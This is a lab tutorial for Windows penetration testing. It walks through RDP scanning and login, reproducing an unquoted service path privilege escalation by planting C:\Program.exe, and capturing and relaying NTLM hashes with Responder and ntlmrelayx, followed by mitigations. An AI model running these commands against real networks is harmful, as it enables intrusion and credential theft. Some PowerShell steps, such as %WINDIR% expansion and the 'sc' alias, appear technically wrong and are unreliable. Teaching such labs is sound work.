# Windows-side RDP, Service Path & NTLM — Step-by-Step Tutorial (Lab)

> **Scope / warning:** These steps are for your controlled lab VM only (e.g., `win-rdp.local`, `win-service.local`, `win-smb.local`, or `192.168.x.y`).  
> Do **not** run or test against systems you don't own or have explicit permission to test.  
> This is a teaching lab — follow ethical rules and your course supervisor's instructions.

---

## Table of contents
1. Pre-lab checks  
2. RDP — discovery, access & post-access checks  
3. Unquoted service path — detect, reproduce (lab-safe), and remediate  
4. NTLM / SMB relay — capture & relay in a controlled lab  
5. Quick mitigations (per vulnerability)  
6. Lab checklist & reporting  
7. Appendix — common commands & payloads

---

## 1) Pre-lab checks (one-time)
1. Boot the **Windows target VM** and ensure networking between your attacker machine (Kali) and the VM.  
2. Confirm target hostnames resolve (via `/etc/hosts` or lab DNS):
   - `win-rdp.local` → RDP demo host  
   - `win-service.local` → service path demo host  
   - `win-smb.local` → SMB/NTLM demo host  
3. From **Kali (attacker)**, verify connectivity:

```bash
# Replace hostnames or IPs with your own
ping -c 2 win-rdp.local
nmap -Pn -p 3389,139,445 --open 192.168.56.0/24
```

4. On the **Windows VM**, snapshot your baseline configuration before starting.  
5. Ensure your instructor approves any temporary AV or firewall changes before testing.

---

## 2) RDP — discovery, access & post-access checks

**Goal:** Demonstrate insecure RDP exposure and authentication risks.

### 2.1 Discover RDP hosts
```bash
nmap -Pn -p 3389 --open 192.168.56.0/24
```

### 2.2 Check RDP and NLA settings (on Windows target)
```powershell
# Check if RDP enabled
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections"

# Check NLA
(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp").UserAuthentication
```

### 2.3 Connect via RDP
```bash
# From Kali
xfreerdp /v:192.168.56.102 /u:Administrator
# Or from Windows host
mstsc /v:192.168.56.102
```

### 2.4 Evidence
- Screenshot RDP desktop after login.  
- Run inside PowerShell:
  ```powershell
  whoami
  systeminfo
  Get-EventLog -LogName Security -Newest 10
  ```
- Note weak password / missing NLA configurations if found.

---

## 3) Unquoted Service Path — detect, reproduce (lab-safe), and remediate

**Goal:** Show how unquoted service paths allow local privilege escalation.

### 3.1 Detect vulnerable services
```powershell
Get-WmiObject -Class Win32_Service | Where-Object {
    ($_.PathName -match ' ') -and ($_.PathName -notmatch '^"')
} | Select-Object Name, PathName
```

### 3.2 Reproduce safely
```powershell
# Run as Administrator
mkdir "C:\Program Files\Test Service"
copy "%WINDIR%\System32\calc.exe" "C:\Program Files\Test Service\service.exe" /Y
copy "%WINDIR%\System32\calc.exe" "C:\Program.exe" /Y

sc create VulnerableTest binPath= "C:\Program Files\Test Service\service.exe" start= auto
sc qc VulnerableTest
sc start VulnerableTest
```

**Expected:** `calc.exe` opens as SYSTEM, proving the path was parsed incorrectly.

### 3.3 Remediate
```powershell
sc config VulnerableTest binPath= "\"C:\Program Files\Test Service\service.exe\""
sc qc VulnerableTest
```

**Expected:** Service runs normally and no longer executes `C:\Program.exe`.

---

## 4) NTLM / SMB Relay — capture & relay (lab-only)

**Goal:** Capture and relay NTLM authentication in an isolated network.

### 4.1 Prepare attacker (Kali)
```bash
sudo responder -I eth0 -wrf
```

### 4.2 Trigger victim (Windows)
Run on Windows (as standard user):
```
\\NonExistentShare\demo
```
This triggers LLMNR/NBT-NS name resolution requests.

### 4.3 Relay (optional, lab-safe)
```bash
ntlmrelayx.py -t smb://192.168.56.102 -smb2support
```

**Expected:** Responder captures hashes; relay may authenticate to another host if configuration allows.

---

## 5) Quick mitigations (practical)

- **RDP:** Enable NLA, use MFA, restrict to VPN/trusted IPs, and patch regularly.  
- **Service Paths:** Quote all binary paths; audit regularly.  
- **NTLM Relay:** Disable LLMNR/NBT-NS, enforce SMB signing, prefer Kerberos, restrict NTLM use.

---

## 6) Lab checklist & reporting
For each vulnerability:
- Screenshot baseline + exploit + fix.  
- Include tool output (e.g., `nmap`, `Responder`, `sc qc`).  
- Describe root cause, exploit method, and mitigation.  
- Revert VM to snapshot afterward.

---

## 7) Appendix — common commands

**RDP scan & connect**
```bash
nmap -Pn -p 3389 --open 192.168.56.0/24
xfreerdp /v:192.168.56.102 /u:Administrator
```

**Check unquoted paths**
```powershell
Get-WmiObject Win32_Service | Where { $_.PathName -match ' ' -and $_.PathName -notmatch '^"' }
```

**Responder & relay**
```bash
sudo responder -I eth0 -wrf
ntlmrelayx.py -t smb://192.168.56.102 -smb2support
```

---

## Final notes — safe experimentation
- Work from snapshots and document all actions.  
- Never test outside approved lab networks.  
- Practise responsible disclosure principles.
